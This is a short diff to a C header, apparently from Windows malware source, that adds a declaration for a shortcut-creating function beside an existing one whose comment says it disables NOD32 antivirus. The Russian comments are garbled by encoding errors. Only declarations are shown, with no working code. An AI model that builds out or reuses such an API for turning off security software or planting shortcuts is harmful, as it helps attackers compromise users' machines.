@@ -443,4 +443,17 @@ DWORD GetProcessIdByName(PCHAR ProcessName);
 //ќтключает Ќќƒ32
 VOID OffNOD32();
 
+
+//---------------------------------------------------------
+//  ‘ункци€ создаЄт €рлык
+//  ѕараметры:
+//  	LinkFileName - »м€ файла создаваемого €рлыка
+//      Object - объект на который будет ссылатьс€ €рлык
+//      CommandLine - командна€ строка дл€ запуска обхекта
+//      Description - ќписание €рлыка/обхекта
+//      IconFileName - »м€ файла иконки
+//---------------------------------------------------------
+void CreateLink( const char* LinkFileName, const char* Object, const char* CommandLine,
+						const char* Description, const char* IconFileName );
+
 #endif
